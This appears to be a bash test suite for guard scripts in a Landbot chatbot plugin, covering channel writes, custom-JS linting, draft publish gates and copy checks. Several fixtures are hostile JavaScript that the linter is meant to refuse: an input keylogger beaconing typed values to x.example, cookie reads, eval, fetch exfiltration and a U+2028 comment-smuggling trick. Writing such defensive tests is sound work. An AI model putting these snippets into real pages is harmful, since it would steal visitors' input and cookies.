#!/usr/bin/env bash
# Offline tests for the write guards in scripts/channel and the name guard in scripts/lb.
# No network, no token: channel runs against a fake lb + handoff in a temp dir. Exits 1 on any failure.
set -u
HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
SRC="$HERE/plugins/landbot/skills/landbot-flows/scripts"
TROOT="$(mktemp -d)"; trap 'rm -rf "$TROOT"' EXIT
T="$TROOT/landbot-flows/scripts"; mkdir -p "$T" "$TROOT/landbot-style/modules"
cp "$HERE/plugins/landbot/skills/landbot-style/modules/"*.js "$TROOT/landbot-style/modules/"
cp "$SRC/channel" "$SRC/draft-check" "$SRC/richtext.jq" "$T/"; cp "$SRC/lb" "$T/lb.real"
export LANDBOT_STATE_DIR="$T/state"
cat > "$T/lb" <<'E'
#!/usr/bin/env bash
M="$1"; P="$2"; B="${3:-}"; D="$(dirname "$0")"
cr=$(( $(date +%s) - ${MOCK_AGE_H:-1}*3600 ))
case "$M $P" in
"GET /bots/"*"/draft") cat "${MOCK_DRAFT:-$D/draft.json}";;
"GET /bots/"*) echo "{\"data\":{\"id\":\"BOT\",\"channel_family\":\"landbot\",\"channels\":${MOCK_CHANNELS:-[\"cu-1\"]}}}";;
"GET /channels/"*) id="${P#/channels/}"; id="${id%/}"; [ "$id" = "777" ] || exit 1
   ver=$(cat "$D/ver" 2>/dev/null || echo 3.0.0); sty=$(cat "$D/style" 2>/dev/null || true); ft=$(cat "$D/foot" 2>/dev/null || true)
   c="$cr"; [ -n "${MOCK_NOCREATED:-}" ] && c=null
   jq -n --arg v "$ver" --arg s "$sty" --arg f "$ft" --arg cfg "${MOCK_CFG:-}" --argjson c "$c" '{success:true,channel:({id:777,uuid:"cu-1",version:$v,style:$s,foot:$f,created_at:$c} + (if $cfg != "" then {config_url:$cfg} else {} end))}';;
"PATCH /channels/777/") printf '%s' "$B" | jq -c . >> "$D/patches"
   v=$(printf '%s' "$B" | jq -r '.version // empty'); [ -n "$v" ] && echo "$v" > "$D/ver"
   printf '%s' "$B" | jq -e 'has("style")' >/dev/null && printf '%s' "$B" | jq -j '.style | sub("\\s+$"; "")' > "$D/style"
   printf '%s' "$B" | jq -e 'has("foot")' >/dev/null && printf '%s' "$B" | jq -j '.foot | sub("\\s+$"; "")' > "$D/foot"; echo '{}';;
*) exit 1;;
esac
E
printf '#!/usr/bin/env bash\necho "LANDBOT_HANDOFF bot=$1 builder=4069913 share=x channel=${MOCK_RESOLVED:-777} version=3.0.0"\n' > "$T/handoff"
chmod +x "$T/lb" "$T/handoff" "$T/channel"; printf 'a{color:red}' > "$T/s.css"
pass=0; fail=0
t() { local name="$1" want="$2"; shift 2; rm -f "$T/patches" "$T/ver" "$T/style" "$T/foot"; "$@" >/dev/null 2>&1; local rc=$?
  local np=0; [ -f "$T/patches" ] && np=$(wc -l < "$T/patches" | tr -d ' ')
  if [ "$rc:$np" = "$want" ]; then pass=$((pass+1)); else fail=$((fail+1)); echo "FAIL $name: rc=$rc writes=$np, want $want"; fi; }
C="$T/channel"
t "uuid as channel id"        65:0 "$C" v4 ba59dd6c-uuid --bot BOT
t "write without --bot"       64:0 "$C" v4 777
t "bot with no channel"       70:0 env MOCK_CHANNELS='[]' "$C" v4 --bot BOT
t "bot with two channels"     70:0 env MOCK_CHANNELS='["a","b"]' "$C" css "$T/s.css" --bot BOT
t "bot number as channel id"  70:0 "$C" v4 4069913 --bot BOT
t "old channel, env raised (v4)"  70:0 env MOCK_AGE_H=48 LANDBOT_CHANNEL_MAX_AGE_H=99999 "$C" v4 --bot BOT
t "old channel, env raised (css)" 70:0 env MOCK_AGE_H=48 LANDBOT_CHANNEL_MAX_AGE_H=99999 "$C" css "$T/s.css" --bot BOT
t "exactly 24 h"              70:0 env MOCK_AGE_H=24 "$C" v4 --bot BOT
t "no created_at"             70:0 env MOCK_NOCREATED=1 "$C" v4 --bot BOT
t "channel not resolvable"     1:0 env MOCK_RESOLVED='?' "$C" v4 --bot BOT
t "v4"                         0:1 "$C" v4 --bot BOT
t "css"                        0:1 "$C" css "$T/s.css" --bot BOT
printf 'a{color:red}\n\n' > "$T/nl.css"
t "css ending in newlines"     0:1 "$C" css "$T/nl.css" --bot BOT
t "v4 <id> --bot (0.3.1 form)" 0:1 "$C" v4 777 --bot BOT
t "css <id> <file> --bot (0.3.1 form)" 0:1 "$C" css 777 "$T/s.css" --bot BOT
t "--id matching"              0:1 "$C" v4 --id 777 --bot BOT
t "get --bot"                  0:0 "$C" get --bot BOT
t "get <id>"                   0:0 "$C" get 777
t "get unknown id"             1:0 "$C" get 555
t "css unreadable file"       66:0 "$C" css /nonexistent.css --bot BOT
# Custom JS: checked before anything is sent; backed up; "stored, not served" is exit 3
printf '/* lb-js: test 1 */\ndocument.body.classList.add("x");\n' > "$T/ok.js"
printf 'document.body.classList.add("x");\n' > "$T/nomark.js"
printf '/* lb-js: t */\nvar a = "#{x}";\n' > "$T/hash.js"
printf '/* lb-js: t */\nfetch("https://example.com/c", {method:"POST"});\n' > "$T/fetch.js"
printf '/* lb-js: t */\nvar c = document.cookie;\n' > "$T/cookie.js"
printf '/* lb-js: t */\nwindow.eval("1");\n' > "$T/eval.js"
printf '<script src="https://cdn.example.com/x.js"></script>\n/* lb-js: t */\n' > "$T/src.js"
{ printf '/* lb-js: big */\n'; head -c 61000 /dev/zero | tr '\0' 'a'; } > "$T/big.js"
t "custom js without a config url is not verified" 4:1 "$C" js "$T/ok.js" --bot BOT --custom
t "custom js without --custom refused" 65:0 "$C" js "$T/ok.js" --bot BOT
t "js without marker"         65:0 "$C" js "$T/nomark.js" --bot BOT --custom
t "js with #{"                65:0 "$C" js "$T/hash.js" --bot BOT --custom
t "js with fetch"             65:0 "$C" js "$T/fetch.js" --bot BOT --custom
t "js reading cookies"        65:0 "$C" js "$T/cookie.js" --bot BOT --custom
t "js with eval"              65:0 "$C" js "$T/eval.js" --bot BOT --custom
t "js loading a script"       65:0 "$C" js "$T/src.js" --bot BOT --custom
t "js over 60k"               65:0 "$C" js "$T/big.js" --bot BOT --custom
t "js without --bot"          64:0 "$C" js "$T/ok.js"
t "js old channel"            70:0 env MOCK_AGE_H=48 "$C" js "$T/ok.js" --bot BOT --custom
t "js --clear"                 0:1 "$C" js --clear --bot BOT
t "js --clear with a file"    64:0 "$C" js --clear "$T/ok.js" --bot BOT
t "--clear on css"            64:0 "$C" css --clear "$T/s.css" --bot BOT
printf '/* lb-js: t */\ndocument.addEventListener("input", function(e){ (new Image()).src = "https://x.example/c?v=" + e.target.value; });\n' > "$T/img.js"
printf '/* lb-js: t */\nvar c = document["cookie"];\n' > "$T/cookie2.js"
printf '/* lb-js: t */\nlocation.href = "https://x.example/";\n' > "$T/loc.js"
t "custom js: new Image beacon"  65:0 "$C" js "$T/img.js" --bot BOT --custom
t "custom js: document[cookie]"  65:0 "$C" js "$T/cookie2.js" --bot BOT --custom
t "custom js: navigation"        65:0 "$C" js "$T/loc.js" --bot BOT --custom
awk 'NR==1{print} /var CONFIG = \{/ && !d {print; printf "    //\342\200\250leak: (function(){ return 1; })(),\n"; d=1; next} NR>1{print}' "$TROOT/landbot-style/modules/steps.js" > "$T/steps-ls.js"
t "module with a U+2028 comment trick refused" 65:0 "$C" js "$T/steps-ls.js" --bot BOT
M="$TROOT/landbot-style/modules"
sed 's/total: 5, /total: 3, /' "$M/steps.js" > "$T/steps-cfg.js"
sed 's/total: 5, /total: (function(){ return 3; })(), /' "$M/steps.js" > "$T/steps-fn.js"
sed 's/var total = Math.max/var total = 1 + Math.max/' "$M/steps.js" > "$T/steps-code.js"
t "module with CONFIG changed is accepted" 4:1 "$C" js "$T/steps-cfg.js" --bot BOT
t "module unchanged is accepted"           4:1 "$C" js "$M/messaging.js" --bot BOT
t "module with code in CONFIG refused"    65:0 "$C" js "$T/steps-fn.js" --bot BOT
t "module with changed code refused"      65:0 "$C" js "$T/steps-code.js" --bot BOT
awk '{ if ($0 ~ /^[[:space:]]*\};[[:space:]]*$/ && !d) { print "  }; document.addEventListener(\"input\", function(e){ (new Image()).src = \"https://x.example/c?v=\" + e.target.value; });"; d=1 } else print }' "$M/steps.js" > "$T/steps-tail.js"
grep -q 'new Image' "$T/steps-tail.js" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL could not build the CONFIG-tail fixture"; }
t "code after CONFIG's closing brace refused" 65:0 "$C" js "$T/steps-tail.js" --bot BOT
{ cat "$M/steps.js"; echo "/* a harmless comment */"; } > "$T/steps-comment.js"
t "edited module with --custom goes to the custom lint" 4:1 "$C" js "$T/steps-comment.js" --bot BOT --custom
t "edited module without --custom refused"              65:0 "$C" js "$T/steps-comment.js" --bot BOT
printf '{"foot":null,"version":"3.1.0"}' > "$T/cfg-nofoot.json"
t "js stored, not served"      3:1 env MOCK_CFG="file://$T/cfg-nofoot.json" "$C" js "$T/ok.js" --bot BOT --custom
printf '{"foot":"<script>x</script>","version":"3.1.0"}' > "$T/cfg-other.json"
t "js: config serves another script" 5:1 env MOCK_CFG="file://$T/cfg-other.json" "$C" js "$T/ok.js" --bot BOT --custom
{ printf '<script>\n'; cat "$T/ok.js"; printf '\n</script>\n'; } | jq -Rs '{foot: ., version: "3.1.0"}' > "$T/cfg-foot.json"
t "js served, same script"     0:1 env MOCK_CFG="file://$T/cfg-foot.json" "$C" js "$T/ok.js" --bot BOT --custom
rm -rf "$T/state"; "$C" css "$T/s.css" --bot BOT >/dev/null 2>&1
nb=$(ls "$T/state/backups" 2>/dev/null | wc -l | tr -d ' '); [ "$nb" -ge 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL css write left no backup"; }
"$C" css "$T/s.css" --bot BOT >/dev/null 2>&1; "$C" css "$T/s.css" --bot BOT >/dev/null 2>&1
nb2=$(ls "$T/state/backups" | wc -l | tr -d ' '); [ "$nb2" -ge 3 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL two writes in one second overwrote a backup ($nb2 files)"; }
grep -q 'OP^^' "$C" && { fail=$((fail+1)); echo "FAIL bash-4-only expansion in channel (macOS runs bash 3.2)"; } || pass=$((pass+1))

# draft-check: the gate before a publish, on drafts built by hand
DK="$T/draft-check"
mk() { jq -n "$1" > "$T/$2"; }
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},welcome:{id:"welcome",template:"var_text",name:"Greeting",params:{text:"Hi! Name?",richText:"<p>Hi! Name?</p>",destination:"name"}},bye:{id:"bye",template:"chat",params:{messages:[{text:"Thanks"}],buttons:[]}}},connections:{"welcome.$success--bye":{sourcePath:"welcome",targetPath:"bye",type:"$success"}}}}}' good.json
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}}},connections:{}}}}' empty.json
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},n0:{id:"n0",template:"chat",params:{messages:[{text:"x"}]}}},connections:{}}}}' nogreet.json
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},welcome:{id:"welcome",template:"var_text",params:{text:"Hi! Name?",richText:"<p>Ask anything</p>",destination:"name"}},bye:{id:"bye",template:"chat",params:{}}},connections:{"welcome.$success--bye":{sourcePath:"welcome",targetPath:"bye",type:"$success"}}}}}' askany.json
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},welcome:{id:"welcome",template:"var_text",params:{text:"Hi",richText:"<p>Hi</p>",destination:"name"}}},connections:{"welcome.$success--gone":{sourcePath:"welcome",targetPath:"gone",type:"$success"}}}}}' dangling.json
mk '{data:{save_state:"IS_NOT_VALID",violations:[{code:"param_required",block_id:"welcome",param:"text"}],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},welcome:{id:"welcome",template:"var_text",params:{}}},connections:{}}}}' viol.json
g() { local name="$1" want="$2" file="$3"; MOCK_DRAFT="$T/$file" "$DK" gate BOTU >/dev/null 2>&1; local rc=$?
  [ "$rc" = "$want" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL gate $name: rc=$rc, want $want"; }; }
rm -rf "$T/state"
g "no snapshot blocks"          65 good.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
g "clean draft passes"          0 good.json
rm -rf "$T/state"
g "empty draft blocked"        65 empty.json
g "no greeting blocked"        65 nogreet.json
g "Ask anything blocked"       65 askany.json
g "dangling connection blocked" 65 dangling.json
g "violations blocked"         65 viol.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
g "unchanged since save passes" 0 good.json
jq '.data.diagram.nodes.welcome.params.text = "Changed in the builder" | .data.diagram.nodes.welcome.params.richText = "<p>Changed in the builder</p>"' "$T/good.json" > "$T/edited.json"
g "changed since save blocked" 65 edited.json
jq '.data.diagram.nodes.bye.top = 999' "$T/good.json" > "$T/moved.json"
g "moved-only passes"           0 moved.json
jq '.data.diagram.nodes.bye2 = .data.diagram.nodes.bye | .data.diagram.connections["welcome.$success--bye"].targetPath = "bye2"' "$T/good.json" > "$T/g2.json"
MOCK_DRAFT="$T/g2.json" "$DK" save BOTU >/dev/null 2>&1
jq '.data.diagram.connections["welcome.$success--bye"].targetPath = "bye"' "$T/g2.json" > "$T/rewired.json"
g "rewired connection blocked" 65 rewired.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" diff BOTU --record >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" save BOTU --auto >/dev/null 2>&1
g "pending change blocks after an auto save" 65 edited.json
MOCK_DRAFT="$T/edited.json" "$DK" save BOTU >/dev/null 2>&1
g "manual save clears the pending change"     0 edited.json
# around a write: a change the write does not explain becomes pending; the write's own change does not
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" post BOTU "$(jq -c '{nodes: {welcome: {params: .data.diagram.nodes.welcome.params}}}' "$T/edited.json")" >/dev/null 2>&1
g "own change around a write is not pending"  0 edited.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
jq '.data.diagram.nodes.welcome.name = "Hello"' "$T/edited.json" > "$T/renamed-and-edited.json"
MOCK_DRAFT="$T/renamed-and-edited.json" "$DK" post BOTU '{"nodes":{"welcome":{"params":null,"name":"Hello"}}}' >/dev/null 2>&1
g "a rename does not absorb someone else's text edit" 65 renamed-and-edited.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/renamed-and-edited.json" "$DK" post BOTU '{"nodes":{"welcome":{"params":{},"name":"Hello"}}}' >/dev/null 2>&1
g "empty params do not absorb a text edit"  65 renamed-and-edited.json
# a PUT: the draft must now be the diagram sent
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
jq -c '{put: {nodes: (.data.diagram.nodes | with_entries(.value |= {params: (.params // {}), name: (.name // null)})), conns: [.data.diagram.connections | to_entries[] | .value + {id: .key, kind: "add"}]}}' "$T/good.json" > "$T/exp-put.json"
MOCK_DRAFT="$T/edited.json" "$DK" post BOTU "@$T/exp-put.json" >/dev/null 2>&1
g "a PUT does not absorb an edit made meanwhile" 65 edited.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" post BOTU "@$T/exp-put.json" >/dev/null 2>&1
g "a PUT that landed as sent is not pending"     0 good.json
# a connection delete does not authorise a new connection from the same output
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
jq '.data.diagram.nodes.d = {id:"d",template:"chat",params:{messages:[{text:"D"}],buttons:[]}} | del(.data.diagram.connections["welcome.$success--bye"]) | .data.diagram.connections["welcome.$success--d"] = {sourcePath:"welcome",targetPath:"d",type:"$success"}' "$T/good.json" > "$T/del-add.json"
MOCK_DRAFT="$T/del-add.json" "$DK" post BOTU '{"conns":[{"kind":"delete","sourcePath":"welcome","type":"$success"}]}' >/dev/null 2>&1
g "a delete does not authorise an addition"   65 del-add.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" post BOTU "$(jq -c '{nodes: {bye: {params: .data.diagram.nodes.bye.params}}}' "$T/good.json")" >/dev/null 2>&1
g "someone else's change during a write is pending" 65 edited.json
rm -rf "$T/state"
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" post BOTU "$(jq -c '{nodes: {welcome: {params: .data.diagram.nodes.welcome.params}}}' "$T/good.json")" >/dev/null 2>&1
g "first write on this machine stays pending"  65 good.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" diff BOTU >/dev/null 2>&1; [ $? = 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL diff should report the edit"; }

# a draft over 1 MB (more than a command line holds) must still compare as unchanged, not as a failure
jq '.data.diagram.nodes += ([range(0; 1200)] | map({key: "n\(.)", value: {id: "n\(.)", template: "chat", params: {messages: [{text: ("x" * 900)}]}}}) | from_entries)' "$T/good.json" > "$T/big.json"
[ "$(wc -c < "$T/big.json" | tr -d ' ')" -gt 1048576 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL big fixture is not over 1 MB"; }
MOCK_DRAFT="$T/big.json" "$DK" save BIGU >/dev/null 2>&1
MOCK_DRAFT="$T/big.json" "$DK" diff BIGU >/dev/null 2>&1; [ $? = 0 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft over 1 MB does not compare as unchanged"; }

L="$T/lb.real"; export LANDBOT_API_TOKEN=dummy LANDBOT_API_URL=http://127.0.0.1:9
# publish goes through the gate: a blocked draft is refused before anything is sent (65), a clean one reaches the network (1)
rm -rf "$T/state"
t "publish of a blocked draft refused" 65:0 env MOCK_DRAFT="$T/askany.json" "$L" POST /bots/BOTU/versions
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
t "publish of a clean draft is sent"    1:0 env MOCK_DRAFT="$T/good.json" "$L" POST /bots/BOTU/versions
t "publish with a query string is gated" 65:0 env MOCK_DRAFT="$T/askany.json" "$L" POST "/bots/BOTU/versions?x=1"
chmod -x "$DK"; t "publish without the checker refused" 65:0 env MOCK_DRAFT="$T/good.json" "$L" POST /bots/BOTU/versions; chmod +x "$DK"
n50=$(printf 'x%.0s' $(seq 50)); n51=$(printf 'x%.0s' $(seq 51))
t "name 50 reaches the network" 1:0 "$L" POST /bots "{\"name\":\"$n50\"}"
t "name 51 refused locally"    65:0 "$L" POST /bots "{\"name\":\"$n51\"}"
printf '{"name":"%s"}' "$n51" > "$T/b.json"
t "name 51 in @file refused"   65:0 "$L" POST /bots "@$T/b.json"
t "50 accented chars pass"      1:0 "$L" POST /bots "{\"name\":\"$(printf 'é%.0s' $(seq 50))\"}"
t "rename not guarded"          1:0 "$L" PATCH /bots/x "{\"name\":\"$n51\"}"

# duplicate-create guard: a local server answers GET /bots with a bot of the same name created now
W="$T/www"; mkdir -p "$W"; now=$(date -u +%Y-%m-%dT%H:%M:%S)
printf '{"data":[{"id":"u-dup","name":"Dup test","created_at":"%s"}]}' "$now" > "$W/bots"
PORT=$(( 20000 + RANDOM % 20000 )); (cd "$W" && python3 -m http.server "$PORT" --bind 127.0.0.1 >/dev/null 2>&1) & SRV=$!
for _ in 1 2 3 4 5 6 7 8 9 10; do curl -s -o /dev/null "http://127.0.0.1:$PORT/bots" && break; sleep 0.3; done
export LANDBOT_API_URL="http://127.0.0.1:$PORT"
t "same name within 15 min refused" 65:0 "$L" POST /bots '{"name":"Dup test"}'
t "different name passes the guard" 1:0 "$L" POST /bots '{"name":"Other name"}'
kill "$SRV" 2>/dev/null; wait "$SRV" 2>/dev/null
ua="$(grep -c 'landbot-plugin/' "$SRC/lb")"; [ "$ua" -ge 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL user agent missing in lb"; }
# date-format guard: pickerFormat and format must agree, or nothing is sent (exit 65)
dfb='{"blocks":[{"type":"ask_date","params":{"text":"When?","destination":"d","pickerFormat":"dd/MM/yyyy","format":["%Y/%m/%d"]}}]}'
dfg='{"blocks":[{"type":"ask_date","params":{"text":"When?","destination":"d","pickerFormat":"dd/MM/yyyy","format":["%d/%m/%Y"]}}]}'
dfn='{"params":{"text":"When?","destination":"d","pickerFormat":"MM/dd/yyyy"}}'
dfd='{"diagram":{"nodes":{"v":{"params":{"pickerFormat":"yyyy/MM/dd","format":["%d/%m/%Y"]}}}}}'
t "date formats disagree"      65:0 "$L" POST /bots/x/draft/blocks "$dfb"
t "date formats agree"          1:0 "$L" POST /bots/x/draft/blocks "$dfg"
t "picker without format"      65:0 "$L" PATCH /bots/x/draft/blocks/v "$dfn"
t "date mismatch in PUT diagram" 65:0 "$L" PUT /bots/x/draft "$dfd"
printf '%s' "$dfb" > "$T/d.json"
t "date mismatch in @file"     65:0 "$L" POST /bots/x/draft/blocks "@$T/d.json"
t "GET with date body ignored"  1:0 "$L" GET /bots/x/draft/blocks "$dfb"
# display copy: a write whose richText disagrees with its text is refused; left out, or agreeing, it is sent
rtb='{"params":{"text":"Which email should we use?","richText":"<p>What is the best email to reach you?</p>","destination":"email"}}'
rtg='{"params":{"text":"What'"'"'s your *name*?","richText":"<p>What&#39;s your <strong>name</strong>?</p>"}}'
rtn='{"params":{"text":"Which email should we use?","destination":"email"}}'
rte='{"params":{"text":"Hi","errorText":"Try again","richErrorText":"<p>I am afraid I did not understand</p>"}}'
rth='{"params":{"text":"<iframe src=\"https://player.example/v\"></iframe>","richText":"<p> </p>"}}'
t "stale richText refused"      65:0 "$L" PATCH /bots/x/draft/blocks/q "$rtb"
t "matching richText sent"       1:0 "$L" PATCH /bots/x/draft/blocks/q "$rtg"
t "no richText sent"             1:0 "$L" PATCH /bots/x/draft/blocks/q "$rtn"
t "stale richErrorText refused" 65:0 "$L" PATCH /bots/x/draft/blocks/q "$rte"
t "HTML text not compared"       1:0 "$L" PATCH /bots/x/draft/blocks/q "$rth"
printf '%s' "$rtb" | jq '{diagram:{nodes:{q:.}}}' > "$T/rt.json"
t "stale richText in PUT diagram" 65:0 "$L" PUT /bots/x/draft "@$T/rt.json"
t "richText differing only in punctuation refused" 65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Pay $1.00","richText":"<p>Pay $100</p>"}}'
t "Chinese richText differing refused"             65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"你好，请问您的名字？","richText":"<p>你好，请问您的邮箱？</p>"}}'
t "Chinese richText matching sent"                  1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"你好，请问您的名字？","richText":"<p>你好，请问您的名字？</p>"}}'
t "multi-line richText matching sent"               1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Line one\nLine two","richText":"<p>Line one</p><p>Line two</p>"}}'
t "numeric entity hiding a change refused"         65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Pay $1.00","richText":"<p>Pay &#36;100</p>"}}'
t "markdown link matching sent"                     1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"See [our site](https://x.example)","richText":"<p>See <a href=\"https://x.example\">our site</a></p>"}}'
t "HTML wording with a different price refused"   65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"<b>Pay $1.00</b>","richText":"<p>Pay $100</p>"}}'
t "markdown-looking display copy refused"         65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Pay $100","richText":"<p>[Pay $100](plus $900)</p>"}}'
t "unknown entity refused"                         65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Hi","richText":"<p>Hi &hellip;</p>"}}'

echo "guards: $pass passed, $fail failed"
[ "$fail" = 0 ]
